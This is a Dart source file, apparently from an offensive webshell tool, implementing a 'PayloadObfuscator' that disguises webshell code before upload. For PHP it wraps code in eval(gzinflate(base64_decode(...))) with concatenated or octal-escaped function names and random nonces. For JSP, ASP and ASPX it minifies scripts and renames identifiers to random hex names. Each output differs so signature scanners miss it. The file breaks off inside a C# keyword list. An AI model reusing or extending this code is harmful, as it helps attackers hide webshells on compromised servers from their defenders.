import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';

import 'deflate_stub.dart' if (dart.library.io) 'deflate_io.dart';

/// Obfuscates and deobfuscates text payloads before uploading to a webshell.
///
/// **PHP**: `eval(gzinflate(base64_decode('…')))` wrappers with optional
/// concat/octal/mixed function-name hiding and a random nonce.
///
/// **JSP / ASP / ASPX**: minifies to a single physical line, strips comments where
/// safe, and renames user identifiers to distinct 6-character lowercase hex names
/// (first character is `a`–`f` so the token is a valid identifier in Java/VB/C#).
/// Identifiers immediately after `.` (member access) are never renamed.
///
/// Each successful obfuscation call produces different output (random splits + nonce).
class PayloadObfuscator {
  // ── PHP detection ─────────────────────────────────────────────────────────
  //
  // All modern wrappers share the same call shape:
  //   <?php $a=<fn>;$b=<fn>;@eval($a($b('B64')));?>   (gzip, 2 vars)
  //   <?php $a=<fn>;@eval($a('B64'));?>                (no-gzip, 1 var)
  //
  // <fn> is one of:
  //   concat  →  'xx'.'yy'  (single-quoted parts)
  //   octal   →  "\NNN\NNN" (double-quoted octal escapes, digits only)
  //   mixed   →  one concat + one octal
  //
  // The regexes below use a shared sub-pattern _phpFnPat that matches either
  // a concat or an octal function-name literal, so one pair of regexes covers
  // concat, octal, and mixed modes.

  // Legacy: literal function names written directly
  static final _phpLiteralGzipRe = RegExp(
    r'''<\?php\s+@?eval\s*\(\s*gzinflate\s*\(\s*base64_decode\s*\(\s*'([A-Za-z0-9+/=]+)'\s*\)\s*\)\s*\)\s*;?\s*\?>''',
    caseSensitive: false,
  );
  static final _phpLiteralB64Re = RegExp(
    r'''<\?php\s+@?eval\s*\(\s*base64_decode\s*\(\s*'([A-Za-z0-9+/=]+)'\s*\)\s*\)\s*;?\s*\?>''',
    caseSensitive: false,
  );

  // Obfuscated (concat / octal / mixed): 2-var gzip form
  //   <?php $x=<fn>;$y=<fn>;@eval($x($y('B64')));?>
  // _phpFnPat inlined: (?:(?:'[^']*'(?:\.'[^']*')+)|(?:"(?:\\[0-7]{3})+"))
  static final _phpObfGzipRe = RegExp(
    r"""<\?php\s+\$\w+=(?:(?:'[^']*'(?:\.'[^']*')+)|(?:"(?:\\[0-7]{3})+"));\$\w+=(?:(?:'[^']*'(?:\.'[^']*')+)|(?:"(?:\\[0-7]{3})+"));@eval\(\$\w+\(\$\w+\('([A-Za-z0-9+/=]+)'\)\)\);?\?>""",
    caseSensitive: false,
  );

  // Obfuscated: 1-var no-gzip form
  //   <?php $x=<fn>;@eval($x('B64'));?>
  static final _phpObfB64Re = RegExp(
    r"""<\?php\s+\$\w+=(?:(?:'[^']*'(?:\.'[^']*')+)|(?:"(?:\\[0-7]{3})+"));@eval\(\$\w+\('([A-Za-z0-9+/=]+)'\)\);?\?>""",
    caseSensitive: false,
  );

  // ── Public API ────────────────────────────────────────────────────────────

  static bool supportsType(String type) =>
      type == 'php' || type == 'jsp' || type == 'asp' || type == 'aspx';

  static bool isObfuscated(String content) {
    final t = content.trim();
    return _phpLiteralGzipRe.hasMatch(t) ||
        _phpLiteralB64Re.hasMatch(t) ||
        _phpObfGzipRe.hasMatch(t) ||
        _phpObfB64Re.hasMatch(t);
  }

  static String? obfuscate(String content, String type) {
    switch (type) {
      case 'php':
        return _obfuscatePhp(content);
      case 'jsp':
        return _obfuscateJspLike(content);
      case 'asp':
        return _obfuscateAsp(content);
      case 'aspx':
        return _obfuscateAspx(content);
      default:
        return null;
    }
  }

  static String? tryDeobfuscate(String content) =>
      _deobfuscatePhp(content.trim());

  static Uint8List? obfuscateBytes(Uint8List bytes, String type) {
    try {
      final out = obfuscate(utf8.decode(bytes), type);
      if (out == null) return null;
      return Uint8List.fromList(utf8.encode(out));
    } catch (_) {
      return null;
    }
  }

  static String typeFromFileName(String name) {
    final ext = name.contains('.') ? name.split('.').last.toLowerCase() : '';
    switch (ext) {
      case 'php':
        return 'php';
      case 'jsp':
      case 'jspx':
        return 'jsp';
      case 'aspx':
        return 'aspx';
      case 'asp':
        return 'asp';
      default:
        return 'other';
    }
  }

  // ── PHP ───────────────────────────────────────────────────────────────────

  // PHP superglobals and special vars — never rename
  static const _phpSuperGlobals = <String>{
    '_GET',
    '_POST',
    '_REQUEST',
    '_SERVER',
    '_FILES',
    '_COOKIE',
    '_SESSION',
    '_ENV',
    '_GLOBALS',
    'GLOBALS',
    'this',
  };

  static String _obfuscatePhp(String content) {
    var code = content.trim();
    if (code.startsWith('<?php')) {
      code = code.substring(5);
    } else if (code.startsWith('<?')) {
      code = code.substring(2);
    }
    if (code.endsWith('?>')) code = code.substring(0, code.length - 2);
    code = code.trim();
    // Rename user-defined variables to single letters
    final renameMap = _buildPhpRenameMap(code);
    if (renameMap.isNotEmpty) code = _applyPhpRenameMap(code, renameMap);
    // Random nonce ensures different gzip output on every call
    final nonce = _rnd.nextInt(0xFFFFFF).toRadixString(16).padLeft(6, '0');
    code = '/*$nonce*/$code';
    final bytes = utf8.encode(code);
    final payload = base64Encode(supportsDeflate ? rawDeflate(bytes) : bytes);
    // Randomly pick one of three obfuscation modes for the PHP wrapper.
    switch (_rnd.nextInt(3)) {
      case 0:
        return _phpConcatWrapper(payload, supportsDeflate);
      case 1:
        return _phpOctalWrapper(payload, supportsDeflate);
      default:
        return _phpMixedWrapper(payload, supportsDeflate);
    }
  }

  // ── PHP wrapper helpers ───────────────────────────────────────────────────
  //
  // All three wrappers share the same runtime shape for full PHP compatibility:
  //
  //   <?php $a=<fn_gzip>;$b=<fn_decode>;@eval($a($b('B64')));?>   (with gzip)
  //   <?php $a=<fn_decode>;@eval($a('B64'));?>                     (no gzip)
  //
  // eval() is kept as a literal language construct — it cannot be called
  // through a variable function in any PHP version.  Only gzinflate and
  // base64_decode (regular functions) are hidden inside variables.

  /// Concat mode: `'bas'.'e64'.'_decode'`  — random split positions each call.
  static String _phpConcatWrapper(String payload, bool withGzip) {
    final vars = _phpRandVarNames(withGzip ? 2 : 1);
    final assigns = StringBuffer();
    if (withGzip) assigns.write('\$${vars[0]}=${_splitConcat("gzinflate")};');
    assigns.write(
      '\$${vars[withGzip ? 1 : 0]}=${_splitConcat("base64_decode")};',
    );
    final call = withGzip
        ? '@eval(\$${vars[0]}(\$${vars[1]}(\'$payload\')))'
        : '@eval(\$${vars[0]}(\'$payload\'))';
    return '<?php $assigns$call;?>';
  }

  /// Octal mode: `"\147\172\151\156\146\154\141\164\145"` — only digits in escapes.
  static String _phpOctalWrapper(String payload, bool withGzip) {
    final vars = _phpRandVarNames(withGzip ? 2 : 1);
    final assigns = StringBuffer();
    if (withGzip) {
      assigns.write('\$${vars[0]}="${_toPhpOctal("gzinflate")}";');
    }
    assigns.write(
      '\$${vars[withGzip ? 1 : 0]}="${_toPhpOctal("base64_decode")}";',
    );
    final call = withGzip
        ? '@eval(\$${vars[0]}(\$${vars[1]}(\'$payload\')))'
        : '@eval(\$${vars[0]}(\'$payload\'))';
    return '<?php $assigns$call;?>';
  }

  /// Mixed mode: one function uses concat, the other uses octal (random choice).
  static String _phpMixedWrapper(String payload, bool withGzip) {
    final vars = _phpRandVarNames(withGzip ? 2 : 1);
    final assigns = StringBuffer();
    if (withGzip) {
      // Randomly assign which function gets which encoding
      final gzipIsOctal = _rnd.nextBool();
      final gzLit = gzipIsOctal
          ? '"${_toPhpOctal("gzinflate")}"'
          : _splitConcat('gzinflate');
      final decLit = gzipIsOctal
          ? _splitConcat('base64_decode')
          : '"${_toPhpOctal("base64_decode")}"';
      assigns.write('\$${vars[0]}=$gzLit;');
      assigns.write('\$${vars[1]}=$decLit;');
    } else {
      // Only one function — randomly pick encoding
      final lit = _rnd.nextBool()
          ? _splitConcat('base64_decode')
          : '"${_toPhpOctal("base64_decode")}"';
      assigns.write('\$${vars[0]}=$lit;');
    }
    final call = withGzip
        ? '@eval(\$${vars[0]}(\$${vars[1]}(\'$payload\')))'
        : '@eval(\$${vars[0]}(\'$payload\'))';
    return '<?php $assigns$call;?>';
  }

  /// Split [s] into 2–3 single-quoted parts joined with '.' at random offsets.
  static String _splitConcat(String s) {
    final len = s.length;
    final cuts = <int>[];
    if (len > 4) {
      cuts.add(1 + _rnd.nextInt(len ~/ 2));
      if (len > 6 && _rnd.nextBool()) {
        final second = cuts[0] + 1 + _rnd.nextInt(len - cuts[0] - 1);
        if (second < len) cuts.add(second);
      }
    } else {
      cuts.add(1 + _rnd.nextInt(len - 1));
    }
    cuts.sort();
    final parts = <String>[];
    var prev = 0;
    for (final c in cuts) {
      parts.add("'${s.substring(prev, c)}'");
      prev = c;
    }
    parts.add("'${s.substring(prev)}'");
    return parts.join('.');
  }

  /// Convert every character to a three-octal-digit PHP escape `\NNN`.
  /// Only digits 0–7 appear in the resulting escape sequences.
  static String _toPhpOctal(String s) {
    final buf = StringBuffer();
    for (final cp in s.runes) {
      buf.write('\\');
      buf.write(cp.toRadixString(8).padLeft(3, '0'));
    }
    return buf.toString();
  }

  /// Generate [n] distinct short PHP variable names like _aK, _bX …
  static List<String> _phpRandVarNames(int n) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    final names = <String>{};
    while (names.length < n) {
      final a = chars[_rnd.nextInt(chars.length)];
      final b = chars[_rnd.nextInt(chars.length)];
      names.add('_$a$b');
    }
    return names.toList();
  }

  /// Collect all user-defined PHP variable names (≥ 2 chars, not superglobals).
  static Map<String, String> _buildPhpRenameMap(String code) {
    final declared = <String>{};
    // Match $varName but not $$varName (variable variables)
    final varRe = RegExp(r'(?<!\$)\$([a-zA-Z_][a-zA-Z0-9_]+)');
    for (final m in varRe.allMatches(code)) {
      final name = m.group(1)!;
      if (!_phpSuperGlobals.contains(name)) declared.add(name);
    }
    final map = <String, String>{};
    var idx = 0;
    for (final n in declared) {
      String short;
      do {
        short = _shortName(idx++);
      } while (declared.contains(short));
      map[n] = short;
    }
    return map;
  }

  static String _applyPhpRenameMap(String code, Map<String, String> map) {
    var result = code;
    for (final entry in map.entries) {
      result = result.replaceAllMapped(
        RegExp(r'(?<!\$)\$' + RegExp.escape(entry.key) + r'\b'),
        (_) => '\$${entry.value}',
      );
    }
    return result;
  }

  static String? _deobfuscatePhp(String t) {
    // Try all four PHP wrapper patterns; extract the base64 payload from each.
    String? decodeGzip(String b64) {
      try {
        var s = utf8.decode(rawInflate(base64Decode(b64)));
        return s.replaceFirst(RegExp(r'^/\*[0-9a-f]+\*/'), '');
      } catch (_) {
        return null;
      }
    }

    String? decodeB64(String b64) {
      try {
        var s = utf8.decode(base64Decode(b64));
        return s.replaceFirst(RegExp(r'^/\*[0-9a-f]+\*/'), '');
      } catch (_) {
        return null;
      }
    }

    for (final pattern in [_phpLiteralGzipRe, _phpObfGzipRe]) {
      final m = pattern.firstMatch(t);
      if (m != null) {
        final decoded = decodeGzip(m.group(1)!);
        if (decoded != null) return '<?php\n$decoded\n?>';
      }
    }
    for (final pattern in [_phpLiteralB64Re, _phpObfB64Re]) {
      final m = pattern.firstMatch(t);
      if (m != null) {
        final decoded = decodeB64(m.group(1)!);
        if (decoded != null) return '<?php\n$decoded\n?>';
      }
    }
    return null;
  }

  /// Generates: a … z, aa, ab … az, ba …
  static String _shortName(int i) {
    if (i < 26) return String.fromCharCode(0x61 + i);
    final hi = i ~/ 26 - 1;
    final lo = i % 26;
    return '${String.fromCharCode(0x61 + hi)}${String.fromCharCode(0x61 + lo)}';
  }

  // ── JSP / ASP / ASPX (single-line + hex identifiers) ─────────────────────

  /// Six lowercase hex characters; first is `a`–`f` so the token is a valid
  /// identifier in Java / VBScript / C#.
  static String _hex6Ident() {
    const hex = '0123456789abcdef';
    final b = StringBuffer();
    b.writeCharCode(0x61 + _rnd.nextInt(6)); // a–f
    for (var i = 0; i < 5; i++) {
      b.write(hex[_rnd.nextInt(16)]);
    }
    return b.toString();
  }

  static String _forceOnePhysicalLine(String s) =>
      s.replaceAll(RegExp(r'[\r\n]+'), ' ').replaceAll(RegExp(r' +'), ' ').trim();

  static String _jspMinifyHtmlFragment(String html) {
    var t = html.replaceAll(RegExp(r'<!--[\s\S]*?-->'), ' ');
    t = t.replaceAll(RegExp(r'\s+'), ' ');
    return t.trim();
  }

  /// Collapses whitespace outside double-quoted spans (directives / page headers).
  static String _collapseWsOutsideDoubleQuotes(String s) {
    final out = StringBuffer();
    var inDq = false;
    for (var i = 0; i < s.length; i++) {
      final c = s[i];
      if (c == '"') {
        inDq = !inDq;
        out.write(c);
        continue;
      }
      if (!inDq && (c == ' ' || c == '\t' || c == '\r' || c == '\n')) {
        while (i + 1 < s.length) {
          final n = s[i + 1];
          if (n == ' ' || n == '\t' || n == '\r' || n == '\n') {
            i++;
            continue;
          }
          break;
        }
        if (out.isNotEmpty && out.toString().codeUnitAt(out.length - 1) != 0x20) {
          out.write(' ');
        }
        continue;
      }
      out.write(c);
    }
    return out.toString();
  }

  /// Java / script inner texts from `<%!`, `<%=`, `<%` (excludes `<%@`, `<%--`).
  static List<String> _jspAllJavaInners(String s) {
    final list = <String>[];
    var i = 0;
    while (i < s.length) {
      final open = s.indexOf('<%', i);
      if (open == -1) break;
      if (open + 3 <= s.length && s.startsWith('<%--', open)) {
        final end = s.indexOf('--%>', open + 4);
        if (end == -1) break;
        i = end + 4;
        continue;
      }
      final close = s.indexOf('%>', open + 2);
      if (close == -1) break;
      final block = s.substring(open, close + 2);
      if (block.startsWith('<%@')) {
        i = close + 2;
        continue;
      }
      if (block.startsWith('<%!')) {
        list.add(block.substring(3, block.length - 2));
      } else if (block.startsWith('<%=')) {
        list.add(block.substring(3, block.length - 2));
      } else if (block.startsWith('<%')) {
        list.add(block.substring(2, block.length - 2));
      }
      i = close + 2;
    }
    return list;
  }

  static String? _obfuscateJspLike(String content) {
    try {
      final out = _jspProcessOuter(content.trim());
      return _forceOnePhysicalLine(out);
    } catch (_) {
      return null;
    }
  }

  static String _jspProcessOuter(String s) {
    final javaMap = _javaLikeUnionRenameMap(_jspAllJavaInners(s));
    final out = StringBuffer();
    var i = 0;
    while (i < s.length) {
      final open = s.indexOf('<%', i);
      if (open == -1) {
        if (i < s.length) out.write(_jspMinifyHtmlFragment(s.substring(i)));
        break;
      }
      if (open > i) out.write(_jspMinifyHtmlFragment(s.substring(i, open)));
      if (open + 3 <= s.length && s.startsWith('<%--', open)) {
        final end = s.indexOf('--%>', open + 4);
        if (end == -1) {
          out.write(s.substring(open));
          break;
        }
        i = end + 4;
        continue;
      }
      final close = s.indexOf('%>', open + 2);
      if (close == -1) {
        out.write(s.substring(open));
        break;
      }
      final block = s.substring(open, close + 2);
      out.write(_jspTransformScriptBlock(block, javaMap));
      i = close + 2;
    }
    return out.toString();
  }

  static String _jspTransformScriptBlock(String block, Map<String, String> javaMap) {
    if (block.startsWith('<%@')) {
      final inner = block.substring(3, block.length - 2);
      return '<%@${_collapseWsOutsideDoubleQuotes(inner)}%>';
    }
    if (block.startsWith('<%!')) {
      final inner = block.substring(3, block.length - 2);
      return '<%!${_javaLikeApplyMapAndMinify(inner, javaMap)}%>';
    }
    if (block.startsWith('<%=')) {
      final inner = block.substring(3, block.length - 2);
      return '<%=${_javaLikeApplyMapAndMinify(inner, javaMap)}%>';
    }
    if (block.startsWith('<%')) {
      final inner = block.substring(2, block.length - 2);
      return '<%${_javaLikeApplyMapAndMinify(inner, javaMap)}%>';
    }
    return block;
  }

  static String? _obfuscateAsp(String content) {
    try {
      final out = _aspAspxProcessOuter(content.trim(), vb: true);
      return _forceOnePhysicalLine(out);
    } catch (_) {
      return null;
    }
  }

  static String? _obfuscateAspx(String content) {
    try {
      final out = _aspAspxProcessOuter(content.trim(), vb: false);
      return _forceOnePhysicalLine(out);
    } catch (_) {
      return null;
    }
  }

  /// `<%` / `<%=` script inners (excludes `<%@`).
  static List<String> _aspAspxAllScriptInners(String s) {
    final list = <String>[];
    var i = 0;
    while (i < s.length) {
      final open = s.indexOf('<%', i);
      if (open == -1) break;
      if (open + 3 <= s.length && s.startsWith('<%--', open)) {
        final end = s.indexOf('--%>', open + 4);
        if (end == -1) break;
        i = end + 4;
        continue;
      }
      final close = s.indexOf('%>', open + 2);
      if (close == -1) break;
      final block = s.substring(open, close + 2);
      if (block.startsWith('<%@')) {
        i = close + 2;
        continue;
      }
      if (block.startsWith('<%=')) {
        list.add(block.substring(3, block.length - 2));
      } else if (block.startsWith('<%')) {
        list.add(block.substring(2, block.length - 2));
      }
      i = close + 2;
    }
    return list;
  }

  static String _aspAspxProcessOuter(String s, {required bool vb}) {
    final inners = _aspAspxAllScriptInners(s);
    final shared = vb ? _vbUnionRenameMap(inners) : _csharpUnionRenameMap(inners);
    final out = StringBuffer();
    var i = 0;
    while (i < s.length) {
      final open = s.indexOf('<%', i);
      if (open == -1) {
        if (i < s.length) out.write(_jspMinifyHtmlFragment(s.substring(i)));
        break;
      }
      if (open > i) out.write(_jspMinifyHtmlFragment(s.substring(i, open)));
      if (open + 3 <= s.length && s.startsWith('<%--', open)) {
        final end = s.indexOf('--%>', open + 4);
        if (end == -1) {
          out.write(s.substring(open));
          break;
        }
        i = end + 4;
        continue;
      }
      final close = s.indexOf('%>', open + 2);
      if (close == -1) {
        out.write(s.substring(open));
        break;
      }
      final block = s.substring(open, close + 2);
      if (block.startsWith('<%@')) {
        final inner = block.substring(3, block.length - 2);
        out.write('<%@${_collapseWsOutsideDoubleQuotes(inner)}%>');
      } else if (block.startsWith('<%=')) {
        final inner = block.substring(3, block.length - 2);
        out.write(
          '<%=${vb ? _vbApplyMapAndMinify(inner, shared) : _csharpLikeApplyMapAndMinify(inner, shared)}%>',
        );
      } else if (block.startsWith('<%')) {
        final inner = block.substring(2, block.length - 2);
        out.write(
          '<%${vb ? _vbApplyMapAndMinify(inner, shared) : _csharpLikeApplyMapAndMinify(inner, shared)}%>',
        );
      } else {
        out.write(block);
      }
      i = close + 2;
    }
    return out.toString();
  }

  static final _javaIdentRe = RegExp(r'(?<![.$])\b([a-zA-Z_$][\w$]*)\b');

  static const _javaBlacklist = <String>{
    // Literals / keywords
    'abstract',
    'assert',
    'boolean',
    'break',
    'byte',
    'case',
    'catch',
    'char',
    'class',
    'const',
    'continue',
    'default',
    'do',
    'double',
    'else',
    'enum',
    'extends',
    'false',
    'final',
    'finally',
    'float',
    'for',
    'goto',
    'if',
    'implements',
    'import',
    'instanceof',
    'int',
    'interface',
    'long',
    'native',
    'new',
    'null',
    'package',
    'private',
    'protected',
    'public',
    'return',
    'short',
    'static',
    'strictfp',
    'super',
    'switch',
    'synchronized',
    'this',
    'throw',
    'throws',
    'transient',
    'true',
    'try',
    'void',
    'volatile',
    'while',
    // JSP / servlet implicit
    'application',
    'config',
    'exception',
    'out',
    'page',
    'pageContext',
    'request',
    'response',
    'session',
    // java.lang & common API (avoid breaking types / members referenced without `.`)
    'Boolean',
    'Byte',
    'Character',
    'Class',
    'ClassLoader',
    'Cloneable',
    'Comparable',
    'Double',
    'Enum',
    'Error',
    'Float',
    'Integer',
    'Long',
    'Math',
    'Number',
    'Object',
    'Runnable',
    'Runtime',
    'Short',
    'StackTraceElement',
    'String',
    'StringBuffer',
    'StringBuilder',
    'System',
    'Thread',
    'Throwable',
    'Void',
    'Exception',
    'RuntimeException',
    'Cipher',
    'SecretKeySpec',
    'Base64',
    'Arrays',
    'Collections',
    'List',
    'Map',
    'Set',
    'Iterator',
    'Collection',
    'ArrayList',
    'HashMap',
    'HashSet',
    'LinkedList',
    'Date',
    'Calendar',
    'UUID',
    'MessageDigest',
    'Process',
    'ProcessBuilder',
    'File',
    'Files',
    'Path',
    'Paths',
    'URL',
    'URI',
    'URLConnection',
    'HttpURLConnection',
    'InputStream',
    'OutputStream',
    'Reader',
    'Writer',
    'BufferedReader',
    'BufferedWriter',
    'PrintWriter',
    'Scanner',
    'Charset',
    'StandardCharsets',
    'CharsetEncoder',
    'CharsetDecoder',
    'ByteBuffer',
    'InetAddress',
    'Socket',
    'ServerSocket',
    'DatagramSocket',
    'Executors',
    'ExecutorService',
    'Future',
    'Callable',
    'Timer',
    'TimerTask',
    'Pattern',
    'Matcher',
    'BigInteger',
    'BigDecimal',
    'Optional',
    'Stream',
    'Collectors',
    'Objects',
    'Comparator',
    'Function',
    'Supplier',
    'Consumer',
    'Predicate',
  };

  /// One shared map for every Java-like snippet in a JSP (so `<%! class U …` and
  /// `<% … new U …` use the same replacement for `U`).
  static Map<String, String> _javaLikeUnionRenameMap(Iterable<String> snippets) {
    final all = <String>{};
    for (final code in snippets) {
      final masked = _maskJavaLikeQuotes(code, <String>[]);
      for (final m in _javaIdentRe.allMatches(masked)) {
        final id = m.group(1)!;
        if (!_javaBlacklist.contains(id)) all.add(id);
      }
    }
    return _buildHexRenameMap(all);
  }

  static String _javaLikeApplyMapAndMinify(String code, Map<String, String> map) {
    final store = <String>[];
    final masked = _maskJavaLikeQuotes(code, store);
    var renamed = _applyHexRenameMap(masked, map);
    for (var i = 0; i < store.length; i++) {
      renamed = renamed.replaceAll('\x01#${i}\x01', store[i]);
    }
    return _javaLikeMinify(renamed);
  }

  /// Masks `'…'` / `"…"` segments (Java / C# style escapes) as `\x01#n\x01`.
  static String _maskJavaLikeQuotes(String code, List<String> store) {
    final out = StringBuffer();
    var i = 0;
    while (i < code.length) {
      final c = code[i];
      if (c == "'" || c == '"') {
        final q = c;
        final start = i;
        i++;
        while (i < code.length) {
          if (code[i] == '\\' && i + 1 < code.length) {
            i += 2;
            continue;
          }
          if (code[i] == q) {
            i++;
            break;
          }
          i++;
        }
        store.add(code.substring(start, i));
        out.write('\x01#${store.length - 1}\x01');
        continue;
      }
      out.write(c);
      i++;
    }
    return out.toString();
  }

  static Map<String, String> _buildHexRenameMap(Set<String> names) {
    final map = <String, String>{};
    final used = <String>{};
    for (final n in names) {
      var h = _hex6Ident();
      while (used.contains(h)) {
        h = _hex6Ident();
      }
      used.add(h);
      map[n] = h;
    }
    return map;
  }

  static String _applyHexRenameMap(String code, Map<String, String> map) {
    if (map.isEmpty) return code;
    final keys = map.keys.toList()
      ..sort((a, b) => b.length.compareTo(a.length));
    var result = code;
    for (final k in keys) {
      final v = map[k]!;
      // Declarations / locals (not after `.` or `$`).
      result = result.replaceAllMapped(
        RegExp(r'(?<![.$])\b' + RegExp.escape(k) + r'\b'),
        (m) => v,
      );
      // User methods like `Class g(...)` are collected without a leading `.`,
      // but invoked as `expr.g(...)` — keep call sites in sync with the map.
      result = result.replaceAllMapped(
        RegExp(r'\.' + RegExp.escape(k) + r'\b'),
        (_) => '.$v',
      );
    }
    return result;
  }

  static String _javaLikeMinify(String code) {
    final out = StringBuffer();
    var i = 0;
    var inDq = false;
    var inSq = false;
    var lineComment = false;
    var blockComment = false;
    var lastOutWasSpace = false;
    void emitSpace() {
      if (out.isEmpty || lastOutWasSpace) return;
      out.write(' ');
      lastOutWasSpace = true;
    }

    void emitChar(String c) {
      out.write(c);
      lastOutWasSpace = false;
    }

    while (i < code.length) {
      final c = code[i];
      if (lineComment) {
        if (c == '\n' || c == '\r') {
          lineComment = false;
          emitSpace();
        }
        i++;
        continue;
      }
      if (blockComment) {
        if (c == '*' && i + 1 < code.length && code[i + 1] == '/') {
          blockComment = false;
          emitSpace();
          i += 2;
          continue;
        }
        i++;
        continue;
      }
      if (inDq) {
        emitChar(c);
        if (c == '\\' && i + 1 < code.length) {
          i++;
          emitChar(code[i]);
        } else if (c == '"') {
          inDq = false;
        }
        i++;
        continue;
      }
      if (inSq) {
        emitChar(c);
        if (c == '\\' && i + 1 < code.length) {
          i++;
          emitChar(code[i]);
        } else if (c == "'") {
          inSq = false;
        }
        i++;
        continue;
      }
      if (c == '/' && i + 1 < code.length && code[i + 1] == '/') {
        lineComment = true;
        i += 2;
        continue;
      }
      if (c == '/' && i + 1 < code.length && code[i + 1] == '*') {
        blockComment = true;
        i += 2;
        continue;
      }
      if (c == '"') {
        emitChar(c);
        inDq = true;
        i++;
        continue;
      }
      if (c == "'") {
        emitChar(c);
        inSq = true;
        i++;
        continue;
      }
      if (c == ' ' || c == '\t' || c == '\n' || c == '\r') {
        emitSpace();
        i++;
        continue;
      }
      emitChar(c);
      i++;
    }
    return out.toString().trim();
  }

  static final _vbIdentRe = RegExp(r'\b([a-zA-Z][a-zA-Z0-9_]*)\b');

  static const _vbBlacklist = <String>{
    'And',
    'As',
    'ByRef',
    'ByVal',
    'Call',
    'Case',
    'Class',
    'Const',
    'Dim',
    'Do',
    'Each',
    'Else',
    'ElseIf',
    'Empty',
    'End',
    'Enum',
    'Eqv',
    'Exit',
    'False',
    'For',
    'Function',
    'Get',
    'GoTo',
    'If',
    'Imp',
    'In',
    'Is',
    'Let',
    'Loop',
    'Mod',
    'New',
    'Next',
    'Not',
    'Nothing',
    'Null',
    'On',
    'Option',
    'Or',
    'Private',
    'Public',
    'RaiseEvent',
    'ReDim',
    'Rem',
    'Resume',
    'Select',
    'Set',
    'Shared',
    'Single',
    'Static',
    'Step',
    'Stop',
    'Sub',
    'Then',
    'To',
    'True',
    'Type',
    'Until',
    'Wend',
    'While',
    'With',
    'Xor',
    'CreateObject',
    'Request',
    'Response',
    'Server',
    'Err',
    'Object',
    'Variant',
    'Integer',
    'Long',
    'String',
    'Boolean',
    'Byte',
    'Date',
    'Currency',
    'Double',
    'Preserve',
    'Explicit',
    'Compare',
    'Like',
    'AndAlso',
    'OrElse',
    'Try',
    'Catch',
    'Finally',
    'Throw',
    'Me',
    'MyBase',
    'MyClass',
    'Handles',
    'Implements',
    'Lib',
    'Friend',
    'Event',
    'AddressOf',
    'CBool',
    'CByte',
    'CCur',
    'CDate',
    'CDbl',
    'CInt',
    'CLng',
    'CSng',
    'CStr',
    'CVar',
    'CVErr',
    'IsArray',
    'IsDate',
    'IsEmpty',
    'IsNull',
    'IsNumeric',
    'IsObject',
    'TypeName',
    'UBound',
    'LBound',
    'Chr',
    'ChrB',
    'ChrW',
    'Asc',
    'AscB',
    'AscW',
    'Mid',
    'Left',
    'Right',
    'Len',
    'Trim',
    'LTrim',
    'RTrim',
    'Replace',
    'Split',
    'Join',
    'InStr',
    'InStrRev',
    'StrComp',
    'UCase',
    'LCase',
    'Format',
    'FormatNumber',
    'FormatCurrency',
    'FormatPercent',
    'FormatDateTime',
    'Now',
    'Time',
    'DateAdd',
    'DateDiff',
    'DatePart',
    'DateSerial',
    'DateValue',
    'TimeSerial',
    'TimeValue',
    'Year',
    'Month',
    'Day',
    'Hour',
    'Minute',
    'Second',
    'Weekday',
    'MonthName',
    'WeekdayName',
    'Eval',
    'Execute',
    'ExecuteGlobal',
    'GetRef',
    'Array',
    'Erase',
    'Filter',
    'ScriptEngine',
    'ScriptEngineBuildVersion',
    'ScriptEngineMajorVersion',
    'ScriptEngineMinorVersion',
  };

  static bool _vbIsReserved(String id) {
    final l = id.toLowerCase();
    for (final k in _vbBlacklist) {
      if (k.toLowerCase() == l) return true;
    }
    return false;
  }

  static String _vbStripLineCommentOutsideQuotes(String line) {
    var inDq = false;
    for (var i = 0; i < line.length; i++) {
      final c = line[i];
      if (c == '"') {
        inDq = !inDq;
        continue;
      }
      if (!inDq && c == "'") {
        return line.substring(0, i).trimRight();
      }
    }
    return line.trimRight();
  }

  static String _vbRemoveLineContinuation(String body) {
    return body.replaceAllMapped(RegExp(r'(\s_)\s*[\r\n]+\s*'), (_) => ' ');
  }

  static String _vbNewlinesToColonOutsideQuotes(String body) {
    final out = StringBuffer();
    var inDq = false;
    for (var i = 0; i < body.length; i++) {
      final c = body[i];
      if (c == '"') {
        inDq = !inDq;
        out.write(c);
        continue;
      }
      if (!inDq && (c == '\r' || c == '\n')) {
        if (c == '\r' && i + 1 < body.length && body[i + 1] == '\n') {
          i++;
        }
        out.write(':');
        while (i + 1 < body.length) {
          final n = body[i + 1];
          if (n == ' ' || n == '\t' || n == '\r' || n == '\n') {
            i++;
            continue;
          }
          break;
        }
        continue;
      }
      out.write(c);
    }
    return out.toString();
  }

  static String _vbPreprocessBody(String inner) {
    var body = _vbRemoveLineContinuation(inner);
    final lines = body.split(RegExp(r'[\r\n]+'));
    final cleaned = lines.map(_vbStripLineCommentOutsideQuotes).join('\n');
    body = _vbNewlinesToColonOutsideQuotes(cleaned);
    return body.replaceAll(RegExp(r':+'), ':').replaceAll(RegExp(r'\s+'), ' ').trim();
  }

  static Map<String, String> _vbUnionRenameMap(Iterable<String> inners) {
    final all = <String>{};
    for (final inner in inners) {
      final body = _vbPreprocessBody(inner);
      final masked = _maskVbDoubleQuotesOnly(body, <String>[]);
      for (final m in _vbIdentRe.allMatches(masked)) {
        final id = m.group(1)!;
        if (!_vbIsReserved(id)) all.add(id);
      }
    }
    return _buildHexRenameMap(all);
  }

  static String _vbApplyMapAndMinify(String inner, Map<String, String> map) {
    final body = _vbPreprocessBody(inner);
    final store = <String>[];
    final masked = _maskVbDoubleQuotesOnly(body, store);
    var renamed = _applyHexRenameMap(masked, map);
    for (var i = 0; i < store.length; i++) {
      renamed = renamed.replaceAll('\x01@${i}\x01', store[i]);
    }
    return renamed;
  }

  static String _maskVbDoubleQuotesOnly(String code, List<String> store) {
    final out = StringBuffer();
    var i = 0;
    while (i < code.length) {
      if (code[i] == '"') {
        final start = i;
        i++;
        while (i < code.length) {
          if (code[i] == '"' && (i + 1 >= code.length || code[i + 1] != '"')) {
            i++;
            break;
          }
          if (code[i] == '"' && i + 1 < code.length && code[i + 1] == '"') {
            i += 2;
            continue;
          }
          i++;
        }
        store.add(code.substring(start, i));
        out.write('\x01@${store.length - 1}\x01');
        continue;
      }
      out.write(code[i]);
      i++;
    }
    return out.toString();
  }

  static const _csharpBlacklist = <String>{
    'abstract',
    'as',
    'base',
    'bool',
    'break',
    'byte',
    'case',
    'catch',
    'char',
    'checked',
    'class',
    'const',
    'continue',
    'decimal',
    'default',
    'delegate',
    'do',
